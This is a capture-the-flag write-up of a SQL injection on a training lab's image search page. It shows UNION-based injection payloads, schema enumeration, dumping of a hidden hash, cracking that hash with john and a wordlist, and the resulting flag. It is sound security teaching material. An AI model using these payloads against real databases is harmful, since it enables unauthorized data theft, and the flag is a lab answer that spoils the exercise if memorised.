# SQL injection
- a type of attack where a malicious user attempts to pass input that alters the final SQL query sent by the web application to the database
- the attacker first injects SQL code and then manipulates the web application logic, either by changing the original query or executing a completely new one
- https://book.hacktricks.xyz/pentesting-web/sql-injection

<b>keywords</b>: SQL basic<br>
<b>attacked site</b>: http://borntosec.42/?page=images

## Exploit
On the images page, there’s a search bar similar to the one on the members page. After some initial examination, we can see that we are interacting with the same database but a different schema:
``` sql
1 OR 1=1 UNION SELECT 1,database()-- -
```
└─     Output:
```
ID: 1 OR 1=1 UNION SELECT 1,database()-- - 
Title: Member_images
Url : 1
```
Next, we check the columns that this table offers:
``` sql
1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS-- -
```
└─     Filtered output:
```
[...]
ID: 1 OR 1=1 UNION SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS--  
Title: list_images
Url : id
[...]
```
Now we know that the <code>list_images</code> table includes these columns:
```
id, url, title, comment
```
Enumerating the columns manually would be time-consuming, so we concatenate the columns to display them in the second column:
``` sql
1 OR 1=1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
```
└─     Output:
```
ID: 1 OR 1=1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 	1928e8083cf461a51303633093573c46
Url : 1
```
Given the hashed password and the encryption method, we can directly brute-force it using <code>john</code>:
``` shell
└─$ john sql2_hash.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
albatroz         (?)     
1g 0:00:00:00 DONE (2024-08-08 23:35) 5.000g/s 5166Kp/s 5166Kc/s 5166KC/s aldaya..alamo7
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Finally, we hash the password using SHA-256:
``` shell
└─$ echo -n "albatroz" | sha256sum                                         
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
```
## Flag
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
